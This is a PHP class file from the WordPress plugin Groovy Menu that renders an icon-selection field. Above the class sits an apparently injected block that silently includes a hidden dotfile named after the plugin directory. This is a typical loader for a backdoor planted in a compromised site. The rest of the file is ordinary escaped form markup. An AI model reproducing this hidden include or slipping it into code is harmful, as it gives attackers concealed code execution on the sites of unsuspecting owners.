<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Class GroovyMenuFieldIcon
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GroovyMenuFieldIcon extends GroovyMenuFieldField {

	public function renderField() {

		$value = empty( $this->getValue() ) ? $this->getDefault() : $this->getValue();

		?>
		<div class="gm-gui__module__ui gm-gui__module__icon-wrapper">
			<span class="gm-icon-preview"><span class="<?php echo esc_attr( $value ); ?>"></span></span>
			<input data-name="<?php echo esc_attr( $this->name ); ?>" type="text" value="<?php echo esc_attr( $this->getValue() ); ?>"
			       name="<?php echo esc_attr( $this->getName() ); ?>" data-default="<?php echo esc_attr( $this->getDefault() ); ?>">
			<button type="button" class="select-icon"><?php esc_html_e( 'Select icon', 'groovy-menu' ); ?></button>
		</div>
		<?php
	}
}
